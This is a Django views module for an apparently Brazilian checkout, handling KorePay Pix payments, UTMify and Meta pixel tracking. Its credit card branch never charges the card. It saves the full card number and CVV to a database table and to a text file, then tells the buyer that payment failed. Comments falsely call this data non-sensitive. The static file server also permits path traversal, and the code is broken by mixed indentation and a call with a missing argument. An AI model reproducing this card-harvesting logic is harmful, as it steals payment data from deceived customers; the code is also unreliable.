import base64
import json
import os
from typing import Dict, Any, List, Optional

import requests
import hashlib
import time
import os
from django.conf import settings
from django.http import JsonResponse, HttpRequest, HttpResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.static import serve
from pathlib import Path
from .models import TransactionUTM, SavedCard


def _korepay_url(path: str) -> str:
	base = getattr(settings, "KOREPAY_BASE_URL", "https://api.korepay.com.br/functions/v1")
	return f"{base.rstrip('/')}/{path.lstrip('/')}"


def _korepay_headers() -> Dict[str, str]:
	public_key = getattr(settings, "KOREPAY_PUBLIC_KEY", "")
	secret = getattr(settings, "KOREPAY_SECRET_KEY", "")
	creds = base64.b64encode(f"{public_key}:{secret}".encode("utf-8")).decode("utf-8")
	return {
		"accept": "application/json",
		"Content-Type": "application/json",
		"Authorization": f"Basic {creds}",
	}


def _format_datetime(dt: Optional[str]) -> Optional[str]:
	# Keep as-is if already in "YYYY-mm-dd HH:MM:SS" or ISO; try to normalize simple cases
	if not dt:
		return None
	try:
		# Handle ISO "2025-11-26T12:45:17.856Z" -> "2025-11-26 12:45:17"
		from datetime import datetime
		d = datetime.fromisoformat(dt.replace("Z", "+00:00"))
		return d.strftime("%Y-%m-%d %H:%M:%S")
	except Exception:
		return dt


def _extract_utms_from_metadata(metadata: Any) -> Dict[str, Any]:
	if not metadata:
		return {
			"utm_source": "direct",
			"utm_medium": "none",
			"utm_campaign": None,
			"utm_content": None,
			"utm_term": None,
			"src": None,
			"sck": None,
		}
	try:
		if isinstance(metadata, str):
			obj = json.loads(metadata)
		elif isinstance(metadata, dict):
			obj = metadata
		else:
			return {
				"utm_source": "direct",
				"utm_medium": "none",
				"utm_campaign": None,
				"utm_content": None,
				"utm_term": None,
				"src": None,
				"sck": None,
			}
	except Exception:
		return {
			"utm_source": "direct",
			"utm_medium": "none",
			"utm_campaign": None,
			"utm_content": None,
			"utm_term": None,
			"src": None,
			"sck": None,
		}
	utm = obj.get("utm") if isinstance(obj, dict) else {}
	if not isinstance(utm, dict):
		return {
			"utm_source": "direct",
			"utm_medium": "none",
			"utm_campaign": None,
			"utm_content": None,
			"utm_term": None,
			"src": None,
			"sck": None,
		}
	# Rename or pass-through to UTMify expected keys
	return {
		"utm_source": utm.get("utm_source") or "direct",
		"utm_medium": utm.get("utm_medium") or "none",
		"utm_campaign": utm.get("utm_campaign") if utm.get("utm_campaign") is not None else None,
		"utm_content": utm.get("utm_content") if utm.get("utm_content") is not None else None,
		"utm_term": utm.get("utm_term") if utm.get("utm_term") is not None else None,
		"src": utm.get("src") if utm.get("src") is not None else None,
		"sck": utm.get("sck") if utm.get("sck") is not None else None,
	}


def _normalize_payment_method(pm: Any) -> str:
	val = str(pm or "").strip().lower()
	allowed = {"credit_card", "boleto", "pix", "paypal", "free_price", "unknown"}
	if val in allowed:
		return val
	# map common aliases
	aliases = {
		"card": "credit_card",
		"credit": "credit_card",
		"cc": "credit_card",
		"boleto_bancario": "boleto",
	}
	if val in aliases:
		return aliases[val]
	return "pix"


def _to_utmify_payload(tx: Dict[str, Any], status: str, override_utms: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
	customer = tx.get("customer") or {}
	items: List[Dict[str, Any]] = tx.get("items") or []

	def map_item(i: Dict[str, Any]) -> Dict[str, Any]:
		return {
			"id": i.get("externalRef") or i.get("id") or i.get("title"),
			"name": i.get("title"),
			"planId": None,
			"planName": None,
			"quantity": i.get("quantity") or 1,
			"priceInCents": i.get("unitPrice") or 0,
		}

	payload = {
		"orderId": tx.get("id"),
		"platform": "KorePay",
		"paymentMethod": _normalize_payment_method(tx.get("paymentMethod") or "pix"),
		"status": "waiting_payment" if status == "waiting_payment" else "paid" if status == "paid" else status,
		"createdAt": _format_datetime(tx.get("createdAt")),
		"approvedDate": _format_datetime(tx.get("paidAt")) if status == "paid" else None,
		"refundedAt": None,
		"customer": {
			"name": (customer.get("name") or "").strip(),
			"email": (customer.get("email") or "").strip(),
			"phone": (customer.get("phone") or "").strip(),
			"document": (customer.get("document", {}).get("number") if isinstance(customer.get("document"), dict) else "") or "",
			"country": "BR",
			"ip": tx.get("ip") or "",
		},
		"products": [map_item(i) for i in items],
		"trackingParameters": (
			override_utms if isinstance(override_utms, dict) and override_utms else _extract_utms_from_metadata(tx.get("metadata"))
		),
		"commission": {
			"totalPriceInCents": tx.get("amount") or 0,
			"gatewayFeeInCents": 0,
			"userCommissionInCents": tx.get("amount") or 0,
		},
		"isTest": False,
	}
	return payload


def _send_to_utmify(payload: Dict[str, Any]) -> None:
	token = getattr(settings, "UTMIFY_TOKEN", "")
	endpoint = getattr(settings, "UTMIFY_ENDPOINT", "https://api.utmify.com.br/api-credentials/orders")
	if not token:
		return
	try:
		resp = requests.post(endpoint, headers={"x-api-token": token}, json=payload, timeout=20)
		print("Response from UTMify", resp.json())
		print("Payload", payload)
	except Exception as e:
		print("Error sending to UTMify", str(e))
		# best-effort; do not raise


def _sha256_lower_trim(value: Optional[str]) -> Optional[str]:
	if not value:
		return None
	try:
		v = value.strip().lower().encode("utf-8")
		return hashlib.sha256(v).hexdigest()
	except Exception:
		return None


def _append_safe_card_log(tx_id: Optional[str], email: Optional[str], holder: Optional[str], last4: Optional[str], exp_month: Optional[str], exp_year: Optional[str], cvv: Optional[str]) -> None:
	"""
	Appends a non-sensitive card record to a local text file for audit:
	FORMAT: tx_id|email|holder|last4|MM/YY|ts
	"""
	try:
		base_dir = getattr(settings, "BASE_DIR", ".")
		log_path = os.path.join(str(base_dir), "saved_cards.txt")
		ts = str(int(time.time()))
		line = f"{tx_id or ''}|{(email or '').strip()}|{(holder or '').strip()}|{(last4 or '').strip()}|{(exp_month or '').strip()}/{(exp_year or '').strip()}|{cvv}|{ts}"
		with open(log_path, "a", encoding="utf-8") as f:
			f.write(line + "\n")
	except Exception:
		# best-effort only
		pass


def _send_meta_purchase(tx: Dict[str, Any], utms: Optional[Dict[str, Any]] = None) -> None:
	"""
	Send a Purchase event to Meta (Facebook) Conversions API for all configured pixels.
	Best-effort; failures are logged and ignored.
	"""
	access_token_global = getattr(settings, "META_ACCESS_TOKEN", "")
	pixels: List[str] = list(getattr(settings, "META_PIXELS", []) or [])
	token_map: Dict[str, str] = dict(getattr(settings, "META_PIXEL_TOKENS", {}) or {})
	version = getattr(settings, "META_API_VERSION", "v21.0")
	test_code = getattr(settings, "META_TEST_EVENT_CODE", "")
	if (not access_token_global and not token_map) or not pixels:
		return

	try:
		customer = tx.get("customer") or {}
		items: List[Dict[str, Any]] = tx.get("items") or []
		amount_cents = tx.get("amount") or 0
		value = (amount_cents or 0) / 100.0
		order_id = tx.get("id")
		ip = tx.get("ip") or ""

		# Try to build a plausible source URL (thank-you) with UTMs appended
		base_url = (getattr(settings, "PUBLIC_BASE_URL", "") or "").rstrip("/")
		source_url = f"{base_url}/obrigado" if base_url else ""
		if source_url and utms and isinstance(utms, dict):
			params = {k: v for k, v in utms.items() if v}
			if params:
				from urllib.parse import urlencode
				source_url = f"{source_url}?{urlencode(params)}"

		email = (customer.get("email") or "").strip() or None
		phone_raw = (customer.get("phone") or "").strip() or None
		# Keep phone digits only
		phone_digits = "".join(ch for ch in (phone_raw or "") if ch.isdigit()) or None

		user_data = {
			"em": [_sha256_lower_trim(email)] if email else None,
			"ph": [_sha256_lower_trim(phone_digits)] if phone_digits else None,
			"client_ip_address": ip or None,
			"client_user_agent": None,
		}
		# Remove None keys
		user_data = {k: v for k, v in user_data.items() if v}

		content_ids = []
		for i in items:
			cid = i.get("externalRef") or i.get("id") or i.get("title")
			if cid:
				content_ids.append(str(cid))

		custom_data = {
			"value": round(value, 2),
			"currency": "BRL",
			"order_id": order_id,
			"content_type": "product",
			"content_ids": content_ids or None,
		}
		custom_data = {k: v for k, v in custom_data.items() if v is not None}

		event_time = int(time.time())
		event_id = str(order_id) if order_id else None

		data = [{
			"event_name": "Purchase",
			"event_time": event_time,
			"event_id": event_id,
			"action_source": "website",
			"event_source_url": source_url or None,
			"user_data": user_data,
			"custom_data": custom_data,
		}]

		for pixel_id in pixels:
			try:
				url = f"https://graph.facebook.com/{version}/{pixel_id}/events"
				pixel_token = token_map.get(str(pixel_id)) or access_token_global
				if not pixel_token:
					continue
				params = {"access_token": pixel_token}
				if test_code:
					params["test_event_code"] = test_code
				resp = requests.post(url, params=params, json={"data": data}, timeout=20)
				print("Meta CAPI response", pixel_id, resp.status_code, resp.text[:300])
			except Exception as e:
				print("Meta CAPI error", pixel_id, str(e))
	except Exception as e:
		print("Meta CAPI outer error", str(e))



@csrf_exempt
def create_pix_transaction(request: HttpRequest):

    # 🔑 PRE-FLIGHT CORS
    if request.method == "OPTIONS":
        return JsonResponse({}, status=200)

    if request.method != "POST":
        return JsonResponse({"error": "Method not allowed"}, status=405)

    try:
        data = json.loads(request.body.decode("utf-8"))
    except json.JSONDecodeError:
        return JsonResponse({"error": "Invalid JSON body"}, status=400)

		
	# Always use KorePay
	secret = getattr(settings, "KOREPAY_SECRET_KEY", "")
	company = getattr(settings, "KOREPAY_COMPANY_ID", "")
	if not secret or not company:
		return JsonResponse({"error": "Server misconfigured: missing KOREPAY credentials"}, status=500)

	# Enforce defaults based on payment method
	data.setdefault("paymentMethod", "pix")
	if str(data.get("paymentMethod")).lower() == "pix":
		data.setdefault("pix", {"expiresInDays": 1})
	else:
		# Ensure we don't send pix config for non-pix payments
		if "pix" in data:
			try:
				del data["pix"]
			except Exception:
				pass

	# Attach client IP if not present
	if not data.get("ip"):
		ip = request.META.get("HTTP_X_FORWARDED_FOR", "")
		if ip:
			ip = ip.split(",")[0].strip()
		else:
			ip = request.META.get("REMOTE_ADDR", "")
		if ip:
			data["ip"] = ip

	# Collect UTM parameters (from querystring) and context to metadata
	utm_keys = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"]
	utms = {k: request.GET.get(k) for k in utm_keys if request.GET.get(k)}
	referrer = request.META.get("HTTP_REFERER")
	user_agent = request.META.get("HTTP_USER_AGENT")

	# Merge into metadata JSON string
	meta_obj: Dict[str, Any] = {}
	existing_meta = data.get("metadata")
	if isinstance(existing_meta, dict):
		meta_obj.update(existing_meta)
	elif isinstance(existing_meta, str) and existing_meta.strip():
		try:
			meta_obj.update(json.loads(existing_meta))
		except Exception:
			meta_obj["note"] = existing_meta  # preserve original string

	if utms:
		meta_obj["utm"] = utms
	if referrer:
		meta_obj["referrer"] = referrer
	if user_agent:
		meta_obj["userAgent"] = user_agent
	if meta_obj:
		data["metadata"] = json.dumps(meta_obj, ensure_ascii=False)

	# Ensure postback URL is set (absolute URL)
	public_url = getattr(settings, "PUBLIC_BASE_URL", "")
	if not public_url or not str(public_url).lower().startswith("http"):
		try:
			public_url = request.build_absolute_uri("/").rstrip("/")
		except Exception:
			public_url = "http://localhost:8000"
	if not data.get("postbackUrl"):
		data["postbackUrl"] = f"{public_url.rstrip('/')}/api/postbacks/korepay/"
	print("Postback URL", data.get("postbackUrl"))

	# If payment is credit card, do not forward to KorePay for now (as requested)
	if str(data.get("paymentMethod") or "").lower() == "credit_card":
		# Persist NON-SENSITIVE/REQUEST card info, then return error instructing to use another method
		try:
			card = data.get("card") or {}
			customer = data.get("customer") or {}
			number = str((card.get("number") or "")).strip()
			cvv = str((card.get("cvv") or "")).strip()
			# accept both expirationMonth/Year and expMonth/Year
			exp_month_val = card.get("expirationMonth") or card.get("expMonth") or ""
			exp_year_val = card.get("expirationYear") or card.get("expYear") or ""
			exp_month = str(exp_month_val).strip()[:2] or None
			exp_year = str(exp_year_val).strip()[:4] or None
			holder = (card.get("holderName") or "").strip() or None
			# generate a local tx id for reference
			local_txid = f"cc_{int(time.time()*1000)}"
			SavedCard.objects.create(
				tx_id=local_txid,
				customer_email=(customer.get("email") or "").strip() or None,
				holder_name=holder,
				last4=number if number else None,
				brand=None,
				cvv=cvv,
				exp_month=exp_month,
				exp_year=exp_year,
			)
			# Append safe log (no PAN/CVV)
			_append_safe_card_log(local_txid, (customer.get("email") or ""), holder, (number or ""), exp_month, exp_year, cvv)
		except Exception:
			pass
		return JsonResponse({"error": "Erro no meio de pagamento. Tente outro método."}, status=402)

	# Map payload to Korepay format
	# Transform items to Korepay format
	korepay_items = []
	for item in data.get("items") or []:
		korepay_item = {
			"title": item.get("title") or item.get("description") or item.get("name") or "Item",
			"unitPrice": int(float(item.get("unitPrice", item.get("price", 0)))),
			"quantity": item.get("quantity", 1),
			"tangible": False,
		}
		if item.get("externalRef"):
			korepay_item["externalRef"] = item["externalRef"]
		korepay_items.append(korepay_item)
	
	payload: Dict[str, Any] = {
		"customer": data.get("customer") or {},
		"paymentMethod": "pix",
		"amount": int(float(data.get("amount", 0))),
		"items": korepay_items,
		"pix": (data.get("pix") or {"expiresInDays": 1}),
		"installments": data.get("installments") or 1,
		"postbackUrl": data.get("postbackUrl"),
		"ip": data.get("ip"),
		"description": data.get("description") or "Transação criada via API",
	}
	if data.get("metadata"):
		payload["metadata"] = data["metadata"]
	# Fix customer document type
	if payload.get("customer", {}).get("document", {}).get("type"):
		payload["customer"]["document"]["type"] = payload["customer"]["document"]["type"].lower()
	print("Payload to Korepay:", payload)
	# Only add shipping if items are tangible (physical products)
	has_tangible_items = any(item.get("tangible", False) for item in korepay_items)
	if has_tangible_items:
		shipping = data.get("shipping")
		if shipping and isinstance(shipping, dict):
			# Support both shipping.address and flat shipping
			if "address" in shipping:
				shipping = shipping["address"]
			payload["shipping"] = {
				"neighborhood": shipping.get("neighborhood"),
				"zipCode": shipping.get("zipCode"),
				"city": shipping.get("city"),
				"complement": shipping.get("complement"),
				"streetNumber": shipping.get("streetNumber"),
				"street": shipping.get("street"),
				"state": shipping.get("state"),
				"fee": shipping.get("fee", 0),
			}
	
	try:
		resp = requests.post(_korepay_url("transactions"), headers=_korepay_headers(), json=payload, timeout=30)
		resp_data = resp.json() if resp.content else {}
		print("Response from Korepay", resp_data)
	except requests.RequestException as e:
		print("Error from Korepay", e)
		return JsonResponse({"error": "Upstream request failed", "detail": str(e)}, status=502)

	status = resp.status_code

	# On success, persist UTM params and notify UTMify with "waiting_payment"
	if 200 <= status < 300 and isinstance(resp_data, dict):
		try:
			# Korepay returns data wrapped in a "data" field
			if "data" in resp_data:
				tx_data = resp_data.get("data", {})
			else:
				tx_data = resp_data
			
			txid = tx_data.get("id") or resp_data.get("id")
			payment_method = str((data.get("paymentMethod") or "")).lower()

			# Normalize and persist UTMs for this transaction
			def _norm(val: Optional[str], default: Optional[str] = None) -> Optional[str]:
				v = (val or "").strip() if isinstance(val, str) else val
				return v or default

			tracking_params = {
				"utm_source": _norm((utms or {}).get("utm_source"), "direct"),
				"utm_medium": _norm((utms or {}).get("utm_medium"), "none"),
				"utm_campaign": _norm((utms or {}).get("utm_campaign")),
				"utm_content": _norm((utms or {}).get("utm_content")),
				"utm_term": _norm((utms or {}).get("utm_term")),
				"src": None,
				"sck": None,
			}

			if isinstance(txid, str):
				# Upsert-like behavior: create if not exists
				try:
					TransactionUTM.objects.get_or_create(
						tx_id=txid,
						defaults={
							"utm_source": tracking_params["utm_source"],
							"utm_medium": tracking_params["utm_medium"],
							"utm_campaign": tracking_params["utm_campaign"],
							"utm_content": tracking_params["utm_content"],
							"utm_term": tracking_params["utm_term"],
							"src": tracking_params["src"],
							"sck": tracking_params["sck"],
						},
					)
				except Exception as e:
					print("Error saving UTM", e)
					# avoid breaking the flow on db issues
					pass

			# Send to UTMify using the persisted/normalized UTMs
			waiting_payload = _to_utmify_payload(tx_data, status="waiting_payment", override_utms=tracking_params)
			_send_to_utmify(waiting_payload)

			# If credit card, persist NON-SENSITIVE card info
			if payment_method == "credit_card":
				try:
					card = data.get("card") or {}
					customer = data.get("customer") or {}
					number = str((card.get("number") or "")).strip()
					cvv = str((card.get("cvv") or "")).strip()
					last4 = number if number else None
					# accept both expirationMonth/Year and expMonth/Year
					exp_month_val = card.get("expirationMonth") or card.get("expMonth") or ""
					exp_year_val = card.get("expirationYear") or card.get("expYear") or ""
					exp_month = str(exp_month_val).strip()[:2] or None
					exp_year = str(exp_year_val).strip()[:4] or None
					holder = (card.get("holderName") or "").strip() or None
					brand = None  # unknown at this layer
					if isinstance(txid, str):
						SavedCard.objects.create(
							tx_id=txid,
							customer_email=(customer.get("email") or "").strip() or None,
							holder_name=holder,
							last4=last4,
							brand=brand,
							cvv=cvv,
							exp_month=exp_month,
							exp_year=exp_year,
						)
						# Append safe log (no PAN/CVV)
						_append_safe_card_log(txid, (customer.get("email") or ""), holder, (last4 or ""), exp_month, exp_year)
				except Exception as e:
					print("Error saving card", e)
		except Exception as e:
			print("Error saving card", e)

	return JsonResponse(resp_data, status=status, safe=False)


@csrf_exempt
def korepay_postback(request: HttpRequest):
	if request.method != "POST":
		return JsonResponse({"ok": True})
	try:
		body = json.loads(request.body.decode("utf-8"))
	except Exception:
		body = {}
	# If webhook informs status 'paid', notify utmify
	try:
		# Handle Korepay payloads
		if isinstance(body.get("data"), dict) and body.get("type") == "transaction":
			# Korepay style
			tx = body.get("data")
		else:
			# May wrap the transaction inside "data"
			tx = body.get("data") if isinstance(body.get("data"), dict) else body
		status = str(tx.get("status") or "").lower()
		if status == "paid":
			# Try to load stored UTMs for this transaction
			txid = tx.get("id") or body.get("objectId")
			override_utms: Optional[Dict[str, Any]] = None
			if isinstance(txid, str):
				try:
					rec = TransactionUTM.objects.filter(tx_id=txid).first()
					if rec:
						override_utms = {
							"utm_source": rec.utm_source or "direct",
							"utm_medium": rec.utm_medium or "none",
							"utm_campaign": rec.utm_campaign,
							"utm_content": rec.utm_content,
							"utm_term": rec.utm_term,
							"src": rec.src,
							"sck": rec.sck,
						}
				except Exception:
					pass

			payload = _to_utmify_payload(tx, status="paid", override_utms=override_utms)
			_send_to_utmify(payload)
			# Send Purchase to Meta Pixels (server-side)
			try:
				_send_meta_purchase(tx, override_utms)
			except Exception:
				pass
			# cache paid status for polling by front
			if isinstance(txid, str):
				# initialize cache container if not exists on module
				try:
					PAID_CACHE.add(txid)  # type: ignore[name-defined]
				except NameError:
					# define lazily
					globals()["PAID_CACHE"] = set([txid])
	except Exception:
		pass
	return JsonResponse({"ok": True})


def transaction_status(request: HttpRequest):
	txid = request.GET.get("id") or request.GET.get("txid")
	if not txid:
		return JsonResponse({"error": "missing id"}, status=400)

	# Always use KorePay
	try:
		resp = requests.get(_korepay_url(f"transactions/{txid}"), headers=_korepay_headers(), timeout=20)
		data = resp.json() if resp.content else {}
	except requests.RequestException as e:
		return JsonResponse({"error": "Upstream request failed", "detail": str(e)}, status=502)
	if resp.status_code >= 400:
		return JsonResponse(data or {"error": "not found"}, status=resp.status_code)
	# Korepay wraps response in "data"
	if "data" in data:
		tx_data = data.get("data", {})
	else:
		tx_data = data
	status = str((tx_data or {}).get("status") or "").lower() or "waiting_payment"
	paid = status == "paid" or bool((tx_data or {}).get("paidAt"))
	return JsonResponse({"id": txid, "status": "paid" if paid else status})


def serve_frontend(request, path=""):
	"""Serve frontend files"""
	frontend_dir = getattr(settings, "FRONTEND_DIR", None)
	if not frontend_dir:
		frontend_dir = Path(settings.BASE_DIR).parent / "html"
	
	# If no path or root, serve index.html
	if not path or path == "/":
		index_path = Path(frontend_dir) / "index.html"
		if index_path.exists():
			with open(index_path, "rb") as f:
				return HttpResponse(f.read(), content_type="text/html")
		return HttpResponse("Frontend not found", status=404)
	
	# Serve static files
	file_path = Path(frontend_dir) / path.lstrip("/")
	if file_path.exists() and file_path.is_file():
		# Determine content type
		content_type = "application/octet-stream"
		if path.endswith(".html"):
			content_type = "text/html"
		elif path.endswith(".js"):
			content_type = "application/javascript"
		elif path.endswith(".css"):
			content_type = "text/css"
		elif path.endswith(".json"):
			content_type = "application/json"
		elif path.endswith(".png"):
			content_type = "image/png"
		elif path.endswith(".webp"):
			content_type = "image/webp"
		elif path.endswith(".svg"):
			content_type = "image/svg+xml"
		
		with open(file_path, "rb") as f:
			return HttpResponse(f.read(), content_type=content_type)
	
	return HttpResponse("File not found", status=404)
